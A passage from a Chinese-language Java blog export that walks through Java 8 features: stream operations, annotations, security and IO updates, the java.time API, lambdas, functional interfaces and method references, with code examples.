<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">double</span> d = Math.random()*<span class="number">1000</span>;</span><br><span class="line">list.add(d+<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> start = System.nanoTime();<span class="comment">//获取系统开始排序的时间点</span></span><br><span class="line"><span class="keyword">int</span> count= (<span class="keyword">int</span>) ((Stream) list.stream().sequential()).sorted().count();</span><br><span class="line"><span class="keyword">long</span> end = System.nanoTime();<span class="comment">//获取系统结束排序的时间点</span></span><br><span class="line"><span class="keyword">long</span> ms = TimeUnit.NANOSECONDS.toMillis(end-start);<span class="comment">//得到串行排序所用的时间</span></span><br><span class="line">System.out.println(ms+”ms”);</span><br></pre></td></tr></table></figure>
<p>并行排序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;</span><br><span class="line"><span class="keyword">double</span> d = Math.random()*<span class="number">1000</span>;</span><br><span class="line">list.add(d+<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> start = System.nanoTime();<span class="comment">//获取系统开始排序的时间点</span></span><br><span class="line"><span class="keyword">int</span> count = (<span class="keyword">int</span>)((Stream) list.stream().parallel()).sorted().count();</span><br><span class="line"><span class="keyword">long</span> end = System.nanoTime();<span class="comment">//获取系统结束排序的时间点</span></span><br><span class="line"><span class="keyword">long</span> ms = TimeUnit.NANOSECONDS.toMillis(end-start);<span class="comment">//得到并行排序所用的时间</span></span><br><span class="line">System.out.println(ms+”ms”);</span><br></pre></td></tr></table></figure>
<p>串行输出为 1200ms，并行输出为 800ms。可见，并行排序的时间相比较串行排序时间要少不少。</p>
<h2 id="中间操作"><a href="#中间操作" class="headerlink" title="中间操作"></a>中间操作</h2><p>该操作会保持 stream 处于中间状态，允许做进一步的操作。它返回的还是的 Stream，允许更多的链式操作。常见的中间操作有：</p>
<p>filter()：对元素进行过滤；</p>
<p>sorted()：对元素排序；</p>
<p>map()：元素的映射；</p>
<p>distinct()：去除重复元素；</p>
<p>subStream()：获取子 Stream 等。</p>
<p>例如，下面是对一个字符串集合进行过滤，返回以“s”开头的字符串集合，并将该集合依次打印出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.stream()</span><br><span class="line">.filter((s) -&gt; s.startsWith(<span class="string">"s"</span>))</span><br><span class="line">.forEach(System.out::println);</span><br></pre></td></tr></table></figure>
<p>这里的 filter(…) 就是一个中间操作，该中间操作可以链式地应用其他 Stream 操作。<br>终止操作</p>
<p>该操作必须是流的最后一个操作，一旦被调用，Stream 就到了一个终止状态，而且不能再使用了。常见的终止操作有：</p>
<p>forEach()：对每个元素做处理；</p>
<p>toArray()：把元素导出到数组；</p>
<p>findFirst()：返回第一个匹配的元素；</p>
<p>anyMatch()：是否有匹配的元素等。</p>
<p>例如，下面是对一个字符串集合进行过滤，返回以“s”开头的字符串集合，并将该集合依次打印出来：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.stream() <span class="comment">//获取列表的 stream 操作对象</span></span><br><span class="line">.filter((s) -&gt; s.startsWith(<span class="string">"s"</span>))<span class="comment">//对这个流做过滤操作</span></span><br><span class="line">.forEach(System.out::println);</span><br></pre></td></tr></table></figure></p>
<p>这里的 forEach(…) 就是一个终止操作，该操作之后不能再链式的添加其他操作了。</p>
<h2 id="注解的更新"><a href="#注解的更新" class="headerlink" title="注解的更新"></a>注解的更新</h2><p>对于注解，Java 8 主要有两点改进：类型注解和重复注解。</p>
<p>Java 8 的类型注解扩展了注解使用的范围。在该版本之前，注解只能是在声明的地方使用。现在几乎可以为任何东西添加注解：局部变量、类与接口，就连方法的异常也能添加注解。新增的两个注释的程序元素类型 ElementType.TYPE_USE 和 ElementType.TYPE_PARAMETER 用来描述注解的新场合。ElementType.TYPE_PARAMETER 表示该注解能写在类型变量的声明语句中。而 ElementType.TYPE_USE 表示该注解能写在使用类型的任何语句中（例如声明语句、泛型和强制转换语句中的类型）。</p>
<p>对类型注解的支持，增强了通过静态分析工具发现错误的能力。原先只能在运行时发现的问题可以提前在编译的时候被排查出来。Java 8 本身虽然没有自带类型检测的框架，但可以通过使用 Checker Framework 这样的第三方工具，自动检查和确认软件的缺陷，提高生产效率。</p>
<p>例如，下面的代码可以通过编译，但是运行时会报 NullPointerException 的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAnno</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Object obj = <span class="keyword">null</span>;</span><br><span class="line">obj.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了能在编译期间就自动检查出这类异常，可以通过类型注解结合 Checker Framework 提前排查出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.checkerframework.checker.nullness.qual.NonNull;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAnno</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="meta">@NonNull</span> Object obj = <span class="keyword">null</span>;</span><br><span class="line">obj.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译时自动检测结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">C:\workspace\TestJava8\src\TestAnno.java:<span class="number">4</span>: Warning:</span><br><span class="line">  (assignment.type.incompatible) $$ <span class="number">2</span> $$ <span class="keyword">null</span> $$ <span class="meta">@UnknownInitialization</span> <span class="meta">@NonNull</span> Object $$ ( <span class="number">152</span>, <span class="number">156</span> )</span><br><span class="line">  $$ incompatible types in assignment.</span><br><span class="line"><span class="meta">@NonNull</span> Object obj = <span class="keyword">null</span>;</span><br><span class="line"> ^</span><br><span class="line"> found : <span class="keyword">null</span></span><br><span class="line"> required: <span class="meta">@UnknownInitialization</span> <span class="meta">@NonNull</span> Object</span><br></pre></td></tr></table></figure>
<p>另外，在该版本之前使用注解的一个限制是相同的注解在同一位置只能声明一次，不能声明多次。Java 8 引入了重复注解机制，这样相同的注解可以在同一地方声明多次。重复注解机制本身必须用 @Repeatable 注解。</p>
<p>例如，下面就是用 @Repeatable 重复注解的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME) \\该注解存在于类文件中并在运行时可以通过反射获取</span><br><span class="line"><span class="meta">@interface</span> Annots &#123;</span><br><span class="line">Annot[] value();</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME) \\该注解存在于类文件中并在运行时可以通过反射获取</span><br><span class="line"><span class="meta">@Repeatable</span>(Annots<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">interface</span> <span class="title">Annot</span> </span>&#123;</span><br><span class="line"><span class="function">String <span class="title">value</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Annot</span>(<span class="string">"a1"</span>)<span class="meta">@Annot</span>(<span class="string">"a2"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Annots annots1 = Test<span class="class">.<span class="keyword">class</span>.<span class="title">getAnnotation</span>(<span class="title">Annots</span>.<span class="title">class</span>)</span>;</span><br><span class="line">System.out.println(annots1.value()[<span class="number">0</span>]+<span class="string">","</span>+annots1.value()[<span class="number">1</span>]); </span><br><span class="line"><span class="comment">// 输出: @Annot(value=a1),@Annot(value=a2)</span></span><br><span class="line">Annot[] annots2 = Test<span class="class">.<span class="keyword">class</span>.<span class="title">getAnnotationsByType</span>(<span class="title">Annot</span>.<span class="title">class</span>)</span>;</span><br><span class="line">System.out.println(annots2[<span class="number">0</span>]+<span class="string">","</span>+annots2[<span class="number">1</span>]); </span><br><span class="line"><span class="comment">// 输出: @Annot(value=a1),@Annot(value=a2)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释 Annot 被 @Repeatable( Annots.class ) 注解。Annots 只是一个容器，它包含 Annot 数组, 编译器尽力向程序员隐藏它的存在。通过这样的方式，Test 类可以被 Annot 注解两次。重复注释的类型可以通过 getAnnotationsByType() 方法来返回。</p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>现今，互联网环境中存在各种各种潜在的威胁，对于 Java 平台来说，安全显得特别重要。为了保证新版本具有更高的安全性，Java 8 在安全性上对许多方面进行了增强，也为此推迟了它的发布日期。下面例举其中几个关于安全性的更新：</p>
<p>支持更强的基于密码的加密算法。基于 AES 的加密算法，例如 PBEWithSHA256AndAES_128 和 PBEWithSHA512AndAES_256，已经被加入进来。</p>
<p>在客户端，TLS1.1 和 TLS1.2 被设为默认启动。并且可以通过新的系统属性包 jdk.tls.client.protocols 来对它进行配置。</p>
<p>Keystore 的增强，包含新的 Keystore 类型 java.security.DomainLoadStoreParameter 和为 Keytool 这个安全钥匙和证书的管理工具添加新的命令行选项-importpassword。同时，添加和更新了一些关于安全性的 API 来支持 KeyStore 的更新。</p>
<p>支持安全的随机数发生器。如果随机数来源于随机性不高的种子，那么那些用随机数来产生密钥或者散列敏感信息的系统就更易受攻击。SecureRandom 这个类的 getInstanceStrong 方法如今可以获取各个平台最强的随机数对象实例，通过这个实例生成像 RSA 私钥和公钥这样具有较高熵的随机数。</p>
<p>JSSE（Java(TM) Secure Socket Extension）服务器端开始支持 SSL/TLS 服务器名字识别 SNI（Server Name Indication）扩展。SNI 扩展目的是 SSL/TLS 协议可以通过 SNI 扩展来识别客户端试图通过握手协议连接的服务器名字。在 Java 7 中只在客户端默认启动 SNI 扩展。如今，在 JSSE 服务器端也开始支持 SNI 扩展了。</p>
<p>安全性比较差的加密方法被默认禁用。默认不支持 DES 相关的 Kerberos 5 加密方法。如果一定要使用这类弱加密方法需要在 krb5.conf 文件中添加 allow_weak_crypto=true。考虑到这类加密方法安全性极差，开发者应该尽量避免使用它。</p>
<h2 id="IO-NIO-的改进"><a href="#IO-NIO-的改进" class="headerlink" title="IO/NIO 的改进"></a>IO/NIO 的改进</h2><p>Java 8 对 IO/NIO 也做了一些改进。主要包括：改进了 java.nio.charset.Charset 的实现，使编码和解码的效率得以提升，也精简了 jre/lib/charsets.jar 包；优化了 String(byte[],*) 构造方法和 String.getBytes() 方法的性能；还增加了一些新的 IO/NIO 方法，使用这些方法可以从文件或者输入流中获取流（java.util.stream.Stream），通过对流的操作，可以简化文本行处理、目录遍历和文件查找。</p>
<p>新增的 API 如下：</p>
<p>BufferedReader.line(): 返回文本行的流 Stream<string></string></p>
<p>File.lines(Path, Charset):返回文本行的流 Stream<string></string></p>
<p>File.list(Path): 遍历当前目录下的文件和目录</p>
<p>File.walk(Path, int, FileVisitOption): 遍历某一个目录下的所有文件和指定深度的子目录</p>
<p>File.find(Path, int, BiPredicate, FileVisitOption… ): 查找相应的文件</p>
<p>下面就是用流式操作列出当前目录下的所有文件和目录：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Files.list(<span class="keyword">new</span> File(<span class="string">"."</span>).toPath())</span><br><span class="line"> .forEach(System.out::println);</span><br></pre></td></tr></table></figure>
<h2 id="全球化功能"><a href="#全球化功能" class="headerlink" title="全球化功能"></a>全球化功能</h2><p>Java 8 版本还完善了全球化功能：支持新的 Unicode 6.2.0 标准，新增了日历和本地化的 API，改进了日期时间的管理等。</p>
<p>Java 的日期与时间 API 问题由来已久，Java 8 之前的版本中关于时间、日期及其他时间日期格式化类由于线程安全、重量级、序列化成本高等问题而饱受批评。Java 8 吸收了 Joda-Time 的精华，以一个新的开始为 Java 创建优秀的 API。新的 java.time 中包含了所有关于时钟（Clock），本地日期（LocalDate）、本地时间（LocalTime）、本地日期时间（LocalDateTime）、时区（ZonedDateTime）和持续时间（Duration）的类。历史悠久的 Date 类新增了 toInstant() 方法，用于把 Date 转换成新的表示形式。这些新增的本地化时间日期 API 大大简化了了日期时间和本地化的管理。</p>
<p>例如，下面是对 LocalDate，LocalTime 的简单应用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LocalDate</span></span><br><span class="line">LocalDate localDate = LocalDate.now(); <span class="comment">//获取本地日期</span></span><br><span class="line">localDate = LocalDate.ofYearDay(<span class="number">2014</span>, <span class="number">200</span>); <span class="comment">// 获得 2014 年的第 200 天 </span></span><br><span class="line">System.out.println(localDate.toString());<span class="comment">//输出：2014-07-19</span></span><br><span class="line">localDate = LocalDate.of(<span class="number">2014</span>, Month.SEPTEMBER, <span class="number">10</span>); <span class="comment">//2014 年 9 月 10 日 </span></span><br><span class="line">System.out.println(localDate.toString());<span class="comment">//输出：2014-09-10</span></span><br><span class="line"><span class="comment">//LocalTime</span></span><br><span class="line">LocalTime localTime = LocalTime.now(); <span class="comment">//获取当前时间</span></span><br><span class="line">System.out.println(localTime.toString());<span class="comment">//输出当前时间</span></span><br><span class="line">localTime = LocalTime.of(<span class="number">10</span>, <span class="number">20</span>, <span class="number">50</span>);<span class="comment">//获得 10:20:50 的时间点</span></span><br><span class="line">System.out.println(localTime.toString());<span class="comment">//输出: 10:20:50</span></span><br><span class="line"><span class="comment">//Clock 时钟</span></span><br><span class="line">Clock clock = Clock.systemDefaultZone();<span class="comment">//获取系统默认时区 (当前瞬时时间 )</span></span><br><span class="line"><span class="keyword">long</span> millis = clock.millis();<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>Java 8 正式版是一个有重大改变的版本，该版本对 Java 做了重大改进。本文通过文字描述及代码实例对新版本中主要新特性做了介绍：函数式接口、Lambda 表达式、集合的流式操作、注解、安全性、IO/NIO、全球化功能。除了文中介绍的这些重要的新功能之外，Java 8 还对 java 工具包 JDBC、Java DB、JavaFX 等方面都有许多改进和增强。这些新增功能简化了开发，提升了代码可读性，增强了代码的安全性，提高了代码的执行效率，为开发者带来了全新的 Java 开发体验，从而推动了 Java 这个平台的前进。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>JDK 8 新特性1</title>
    <url>/Java/JDK%208%20%E6%96%B0%E7%89%B9%E6%80%A71/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/weixin_42709585/article/details/82621580" target="_blank" rel="noopener">原文链接</a></p>
<h2 id="1-Lambda表达式"><a href="#1-Lambda表达式" class="headerlink" title="1. Lambda表达式"></a>1. Lambda表达式</h2><p>Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性。Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。可以使代码变的更加简洁紧凑。</p>
<h3 id="1-1-基本语法："><a href="#1-1-基本语法：" class="headerlink" title="1.1 基本语法："></a>1.1 基本语法：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(参数列表) -&gt; &#123;代码块&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意：</p>
<ul>
<li>参数类型可省略，编译器可以自己推断</li>
<li>如果只有一个参数，圆括号可以省略</li>
<li>代码块如果只是一行代码，大括号也可以省略</li>
<li>如果代码块是一行，且是有结果的表达式，<code>return</code>可以省略</li>
</ul>
<p><strong>注意：</strong>事实上，把Lambda表达式可以看做是匿名内部类的一种简写方式。当然，前提是这个匿名内部类对应的必须是接口，而且接口中必须只有一个函数！Lambda表达式就是直接编写函数的：参数列表、代码体、返回值等信息，<strong><code>用函数来代替完整的匿名内部类</code></strong>！</p>
<h3 id="1-2-用法示例"><a href="#1-2-用法示例" class="headerlink" title="1.2 用法示例"></a>1.2 用法示例</h3><h5 id="示例1：多个参数"><a href="#示例1：多个参数" class="headerlink" title="示例1：多个参数"></a>示例1：多个参数</h5><p>准备一个集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 准备一个集合</span></span><br><span class="line">List&lt;Integer&gt; list = Arrays.asList(<span class="number">10</span>, <span class="number">5</span>, <span class="number">25</span>, -<span class="number">15</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure>
<p>假设我们要对集合排序，我们先看JDK7的写法，需要通过匿名内部类来构造一个<code>Comparator</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Jdk1.7写法</span></span><br><span class="line">Collections.sort(list,<span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o1 - o2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(list);<span class="comment">// [-15, 5, 10, 20, 25]</span></span><br></pre></td></tr></table></figure>
<p>如果是jdk8，我们可以使用新增的集合API：<code>sort(Comparator c)</code>方法，接收一个比较器，我们用Lambda来代替<code>Comparator</code> 的匿名内部类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Jdk1.8写法，参数列表的数据类型可省略：</span></span><br><span class="line">list.sort((i1,i2) -&gt; &#123; <span class="keyword">return</span> i1 - i2;&#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(list);<span class="comment">// [-15, 5, 10, 20, 25]</span></span><br></pre></td></tr></table></figure>
<p>对比一下<code>Comparator</code>中的<code>compare()</code>方法，你会发现：这里编写的Lambda表达式，恰恰就是<code>compare()</code>方法的简写形式，JDK8会把它编译为匿名内部类。是不是简单多了！</p>
<p>别着急，我们发现这里的代码块只有一行代码，符合前面的省略规则，我们可以简写为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Jdk8写法</span></span><br><span class="line"><span class="comment">// 因为代码块是一个有返回值的表达式，可以省略大括号以及return</span></span><br><span class="line">list.sort((i1,i2) -&gt; i1 - i2);</span><br></pre></td></tr></table></figure>
<h5 id="示例2：单个参数"><a href="#示例2：单个参数" class="headerlink" title="示例2：单个参数"></a>示例2：单个参数</h5><p>还以刚才的集合为例，现在我们想要遍历集合中的元素，并且打印。</p>
<p>先用jdk1.7的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JDK1.7遍历并打印集合</span></span><br><span class="line"><span class="keyword">for</span> (Integer i : list) &#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>jdk1.8给集合添加了一个方法：<code>foreach()</code> ，接收一个对元素进行操作的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JDK1.8遍历并打印集合，因为只有一个参数，所以我们可以省略小括号:</span></span><br><span class="line">list.forEach(i -&gt; System.out.println(i));</span><br></pre></td></tr></table></figure>
<h5 id="实例3：把Lambda赋值给变量"><a href="#实例3：把Lambda赋值给变量" class="headerlink" title="实例3：把Lambda赋值给变量"></a>实例3：把Lambda赋值给变量</h5><p>Lambda表达式的实质其实还是匿名内部类，所以我们其实可以把Lambda表达式赋值给某个变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将一个Lambda表达式赋值给某个接口：</span></span><br><span class="line">Runnable task = () -&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里其实是Runnable接口的匿名内部类，我们在编写run方法。</span></span><br><span class="line">    System.out.println(<span class="string">"hello lambda!"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">new</span> Thread(task).start();</span><br></pre></td></tr></table></figure>
<p>不过上面的用法很少见，一般都是直接把Lambda作为参数。</p>
<h5 id="示例4：隐式final"><a href="#示例4：隐式final" class="headerlink" title="示例4：隐式final"></a>示例4：隐式final</h5><p>Lambda表达式的实质其实还是匿名内部类，而匿名内部类在访问外部局部变量时，要求变量必须声明为<code>final</code>！不过我们在使用Lambda表达式时无需声明<code>final</code>，这并不是说违反了匿名内部类的规则，因为Lambda底层会隐式的把变量设置为<code>final</code>，在后续的操作中，一定不能修改该变量：</p>
<p>正确示范：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个局部变量</span></span><br><span class="line"><span class="keyword">int</span> num = -<span class="number">1</span>;</span><br><span class="line">Runnable r = () -&gt; &#123;</span><br><span class="line">    <span class="comment">// 在Lambda表达式中使用局部变量num，num会被隐式声明为final</span></span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">new</span> Thread(r).start();<span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>错误案例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个局部变量</span></span><br><span class="line"><span class="keyword">int</span> num = -<span class="number">1</span>;</span><br><span class="line">Runnable r = () -&gt; &#123;</span><br><span class="line">    <span class="comment">// 在Lambda表达式中使用局部变量num，num会被隐式声明为final，不能进行任何修改操作</span></span><br><span class="line">    System.out.println(num++);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">new</span> Thread(r).start();<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
<h2 id="2-函数式接口"><a href="#2-函数式接口" class="headerlink" title="2. 函数式接口"></a>2. 函数式接口</h2><p>经过前面的学习，相信大家对于Lambda表达式已经有了初步的了解。总结一下：</p>
<ul>
<li>Lambda表达式是接口的匿名内部类的简写形式</li>
<li>接口必须满足：内部只有一个函数</li>
</ul>
<p>其实这样的接口，我们称为函数式接口，我们学过的<code>Runnable</code>、<code>Comparator</code>都是函数式接口的典型代表。但是在实践中，函数接口是非常脆弱的，只要有人在接口里添加多一个方法，那么这个接口就不是函数接口了，就会导致编译失败。Java 8提供了一个特殊的注解<code>@FunctionalInterface</code>来克服上面提到的脆弱性并且显示地表明函数接口。而且jdk8版本中，对很多已经存在的接口都添加了<code>@FunctionalInterface</code>注解，例如<code>Runnable</code>接口：</p>
<p><img src="../image/runnable.png" alt></p>
<p>另外，Jdk8默认提供了一些函数式接口供我们使用：</p>
<h3 id="2-1-Function类型接口"><a href="#2-1-Function类型接口" class="headerlink" title="2.1 Function类型接口"></a>2.1 Function类型接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Function</span>&lt;<span class="title">T</span>, <span class="title">R</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">// 接收一个参数T，返回一个结果R</span></span><br><span class="line">    <span class="function">R <span class="title">apply</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Function代表的是有参数，有返回值的函数。还有很多类似的Function接口：</p>
<table>
<thead>
<tr>
<th style="text-align:left">接口名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>BiFunction&lt;T,U,R&gt;</code></td>
<td>接收两个T和U类型的参数，并且返回R类型结果的函数</td>
</tr>
<tr>
<td style="text-align:left"><code>DoubleFunction&lt;R&gt;</code></td>
<td>接收double类型参数，并且返回R类型结果的函数</td>
</tr>
<tr>
<td style="text-align:left"><code>IntFunction&lt;R&gt;</code></td>
<td>接收int类型参数，并且返回R类型结果的函数</td>
</tr>
<tr>
<td style="text-align:left"><code>LongFunction&lt;R&gt;</code></td>
<td>接收long类型参数，并且返回R类型结果的函数</td>
</tr>
<tr>
<td style="text-align:left"><code>ToDoubleFunction&lt;T&gt;</code></td>
<td>接收T类型参数，并且返回double类型结果</td>
</tr>
<tr>
<td style="text-align:left"><code>ToIntFunction&lt;T&gt;</code></td>
<td>接收T类型参数，并且返回int类型结果</td>
</tr>
<tr>
<td style="text-align:left"><code>ToLongFunction&lt;T&gt;</code></td>
<td>接收T类型参数，并且返回long类型结果</td>
</tr>
<tr>
<td style="text-align:left"><code>DoubleToIntFunction</code></td>
<td>接收double类型参数，返回int类型结果</td>
</tr>
<tr>
<td style="text-align:left"><code>DoubleToLongFunction</code></td>
<td>接收double类型参数，返回long类型结果</td>
</tr>
</tbody>
</table>
<p>看出规律了吗？这些都是一类函数接口，在Function基础上衍生出的，要么明确了参数不确定返回结果，要么明确结果不知道参数类型，要么两者都知道。</p>
<h3 id="2-2-Consumer系列"><a href="#2-2-Consumer系列" class="headerlink" title="2.2 Consumer系列"></a>2.2 Consumer系列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Consumer</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">// 接收T类型参数，不返回结果</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Consumer系列与Function系列一样，有各种衍生接口，这里不一一列出了。不过都具备类似的特征：那就是不返回任何结果。</p>
<h3 id="2-3-Predicate系列"><a href="#2-3-Predicate系列" class="headerlink" title="2.3 Predicate系列"></a>2.3 Predicate系列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Predicate</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">// 接收T类型参数，返回boolean类型结果</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">test</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Predicate系列参数不固定，但是返回的一定是boolean类型。</p>
<h3 id="2-4-Supplier系列"><a href="#2-4-Supplier系列" class="headerlink" title="2.4 Supplier系列"></a>2.4 Supplier系列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Supplier</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">// 无需参数，返回一个T类型结果</span></span><br><span class="line">    <span class="function">T <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Supplier系列，英文翻译就是“供应者”，顾名思义：只产出，不收取。所以不接受任何参数，返回T类型结果。</p>
<h2 id="3-方法引用"><a href="#3-方法引用" class="headerlink" title="3. 方法引用"></a>3. 方法引用</h2><p>方法引用使得开发者可以将已经存在的方法作为变量来传递使用。方法引用可以和Lambda表达式配合使用。</p>
<h3 id="3-1-语法："><a href="#3-1-语法：" class="headerlink" title="3.1 语法："></a>3.1 语法：</h3><p>总共有四类方法引用：</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>类名::静态方法名</td>
<td>类的静态方法的引用</td>
</tr>
<tr>
<td>类名::非静态方法名</td>
<td>类的非静态方法的引用</td>
</tr>
<tr>
<td>实例对象::非静态方法名</td>
<td>类的指定实例对象的非静态方法引用</td>
</tr>
<tr>
<td>类名::new</td>
<td>类的构造方法引用</td>
</tr>
</tbody>
</table>
<h3 id="3-2-示例"><a href="#3-2-示例" class="headerlink" title="3.2 示例"></a>3.2 示例</h3><p>首先我们编写一个集合工具类，提供一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CollectionUtil</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 利用function将list集合中的每一个元素转换后形成新的集合返回</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> list 要转换的源集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> function 转换元素的方式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> &lt;T&gt; 源集合的元素类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> &lt;R&gt; 转换后的元素类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T,R&gt; <span class="function">List&lt;R&gt; <span class="title">convert</span><span class="params">(List&lt;T&gt; list, Function&lt;T,R&gt; function)</span></span>&#123;</span><br><span class="line">        List&lt;R&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.forEach(t -&gt; result.add(function.apply(t)));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    